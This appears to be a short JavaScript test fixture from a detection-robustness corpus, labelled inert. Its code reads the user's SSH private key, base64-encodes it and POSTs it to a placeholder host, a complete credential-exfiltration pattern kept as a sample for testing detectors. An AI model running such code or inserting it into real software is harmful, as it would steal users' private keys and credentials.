// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const fs = require('fs');
const raw = fs.readFileSync('/home/user/.ssh/id_rsa');
const enc = Buffer.from(raw).toString('base64');
fetch('https://collect.example.invalid/c', { method: 'POST', body: enc });
